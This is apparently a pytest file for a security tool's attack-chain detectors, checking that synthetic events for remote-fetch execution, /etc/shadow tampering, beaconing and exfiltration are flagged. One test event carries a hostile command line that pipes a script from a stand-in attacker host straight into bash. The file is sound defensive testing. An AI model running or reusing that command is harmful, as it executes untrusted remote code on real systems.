from __future__ import annotations

from app.features.attack_chain.domain.config import load_config
from app.features.attack_chain.domain.detectors import detect_steps


def _base_event(event_type: str, extra: dict) -> dict:
    return {
        "event_type": event_type,
        "agent_id": "agent-1",
        "src_ip": "10.0.0.10",
        "dst_ip": "198.51.100.8",
        "dst_port": 443,
        "proto": "tcp",
        "bytes": 1234,
        "extra": extra,
    }


def test_detect_proc_exec_remote_fetch_and_service_shell() -> None:
    cfg = load_config()
    ev = _base_event(
        "proc_exec",
        {
            "cmdline": "curl -fsSL https://evil.test/x.sh | bash",
            "exe_name": "bash",
            "parent_exe_name": "nginx",
            "exec_patterns": ["remote_fetch_exec", "service_shell_child"],
        },
    )
    steps = detect_steps(ev, cfg, allowlist=[])
    kinds = {s.kind for s in steps}
    assert "exec_remote_fetch" in kinds
    assert "exec_service_shell" in kinds


def test_detect_fim_maps_to_persistence_and_tamper() -> None:
    cfg = load_config()
    ev = _base_event(
        "fim_change",
        {
            "path": "/etc/shadow",
            "path_category": "security_file",
            "action": "modify",
            "tamper_related": True,
        },
    )
    steps = detect_steps(ev, cfg, allowlist=[])
    assert steps
    assert steps[0].kind in {"tamper", "persistence"}
    assert steps[0].technique_id in {"T1562", "T1543"}


def test_detect_beacon_and_exfil_confidence_propagates() -> None:
    cfg = load_config()
    beacon = _base_event(
        "beacon_suspect",
        {"confidence": 91, "heuristic_name": "beacon_periodic_outbound", "reasons": ["periodic"]},
    )
    exfil = _base_event(
        "exfil_suspect",
        {"confidence": 88, "heuristic_name": "exfil_burst_rare_destination", "reasons": ["burst"]},
    )
    b_steps = detect_steps(beacon, cfg, allowlist=[])
    e_steps = detect_steps(exfil, cfg, allowlist=[])
    assert b_steps and b_steps[0].confidence >= 90
    assert e_steps and e_steps[0].confidence >= 85
    assert e_steps[0].technique_id == "T1048"
